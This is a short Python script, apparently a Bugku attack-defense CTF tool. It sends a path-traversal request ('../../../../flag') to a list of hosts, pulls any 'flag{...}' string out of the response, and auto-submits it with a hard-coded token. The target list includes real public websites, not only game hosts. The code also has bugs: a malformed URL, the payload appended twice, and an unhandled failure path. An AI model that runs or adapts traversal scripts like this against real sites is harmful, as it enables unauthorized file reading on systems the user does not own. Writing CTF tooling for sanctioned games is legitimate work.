import requests

ip = ["https://www.yuque.com", "https:/www.baidu.com", "https://base64.us/"]
payload = "/api/word.php?src=../../../../flag"

def getflag():

    for i in range(0, len(ip)):
        ips = ip[i] + payload

        header = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        print(ips)
        try:
            body = requests.get(ips + payload, headers=header)
        except requests.exceptions.InvalidURL:
            print("请求异常: "+ip[i])
        if "flag" in body.text:
            print("[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+] 漏洞存在")
            flag = body.text
            demo = flag.find("flag{")  # flag开始的长度
            demo2 = len("flag{418f536a6a1e236a6a9fc4558f1239a5}")  # 获取flag的总长度
            print(flag[demo:demo + demo2])
            flags = flag[demo:demo + demo2]  # 表示从开始到结束的长度
            # 提交flag
            http = "https://ctf.bugku.com/pvp/submit.html?token=b48c4bb457a58194a855755972785536&flag={0}".format(flags)
            body = requests.get(http)
            if "正确" in body.text:
                print("提交成功")
            else:
                print("提交失败")
        else:
            print("[-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-] 利用失败")

if __name__ == '__main__':
    getflag()